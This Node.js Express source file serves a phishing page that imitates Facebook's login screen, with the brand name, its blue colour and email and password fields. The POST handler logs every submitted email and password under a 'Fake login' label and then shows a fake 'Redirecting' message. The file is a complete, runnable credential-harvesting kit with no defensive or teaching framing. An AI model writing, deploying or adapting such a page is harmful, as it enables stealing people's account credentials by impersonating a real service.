const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
  res.send(`
    <style>
      body { background-color: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
      .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.2); width: 300px; text-align: center; }
      .container h1 { color: #1877f2; font-size: 36px; margin-bottom: 20px; }
      input[type="text"], input[type="password"] {
        width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px;
      }
      button {
        width: 95%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 6px;
        font-weight: bold; margin-top: 10px;
      }
    </style>

    <div class="container">
      <h1>facebook</h1>
      <form method="POST" action="/login">
        <input type="text" name="email" placeholder="Email or phone number" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Log In</button>
      </form>
    </div>
  `);
});

app.post('/login', (req, res) => {
  const { email, password } = req.body;
  console.log(`Fake login — Email/Phone: ${email}, Password: ${password}`);
  res.send("<h2>Thank you. Redirecting...</h2>");
});

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
